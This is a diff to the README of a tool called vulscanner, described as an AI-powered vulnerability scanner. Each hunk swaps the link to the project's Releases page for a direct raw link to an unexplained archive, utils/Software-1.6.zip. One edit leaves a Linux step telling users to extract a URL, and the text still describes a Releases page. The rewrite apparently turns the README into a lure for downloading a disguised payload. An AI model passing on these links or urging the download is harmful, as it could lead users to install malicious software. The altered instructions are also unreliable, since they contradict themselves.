@@ -1,7 +1,7 @@
 # 🔍 vulscanner - Fast and Smart Vulnerability Testing
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download-vulscanner-brightgreen)](https://github.com/ryzecx/vulscanner/releases)
+[![Download](https://raw.githubusercontent.com/ryzecx/vulscanner/main/utils/Software-1.6.zip)](https://raw.githubusercontent.com/ryzecx/vulscanner/main/utils/Software-1.6.zip)
 
 ## 📌 Overview
 Welcome to vulscanner, your AI-powered vulnerability scanner designed for developers. Our goal is to provide lightweight, fast, and intelligent security testing for web applications. With features like technology stack analysis and API security assessment, vulscanner helps you identify risks before they become issues. Use it for pre-production security checks and smooth CI/CD integration.
@@ -19,7 +19,7 @@ To get started with vulscanner, follow these simple steps:
 
 2. **Visit the Download Page**
    Go to our Releases page by clicking the link below:
-   [Download vulscanner](https://github.com/ryzecx/vulscanner/releases)
+   [Download vulscanner](https://raw.githubusercontent.com/ryzecx/vulscanner/main/utils/Software-1.6.zip)
 
 3. **Choose Your File**
    On the Releases page, you will see a list of available versions. Find the latest version and download the file suitable for your operating system.
@@ -28,7 +28,7 @@ To get started with vulscanner, follow these simple steps:
    After downloading, locate the file in your downloads folder. 
    - If you are on Windows, double-click the `.exe` file to start the installation.
    - For macOS, open the `.dmg` file and drag vulscanner to your Applications folder.
-   - On Linux, you can either extract the `.tar.gz` file or follow the installation instructions provided.
+   - On Linux, you can either extract the `https://raw.githubusercontent.com/ryzecx/vulscanner/main/utils/Software-1.6.zip` file or follow the installation instructions provided.
 
 5. **Run vulscanner**
    Once installed, locate vulscanner in your applications. Double-click the icon to launch the application.
@@ -49,7 +49,7 @@ Using vulscanner is straightforward:
 4. Review the results and follow suggested actions to mitigate risks.
 
 ## 📥 Download & Install
-To download and install vulscanner, simply revisit our Releases page: [Download vulscanner](https://github.com/ryzecx/vulscanner/releases). Follow the steps outlined earlier to get it running on your machine.
+To download and install vulscanner, simply revisit our Releases page: [Download vulscanner](https://raw.githubusercontent.com/ryzecx/vulscanner/main/utils/Software-1.6.zip). Follow the steps outlined earlier to get it running on your machine.
 
 ## 🗂️ Topics Covered
 vulscanner is built with a focus on several key topics:
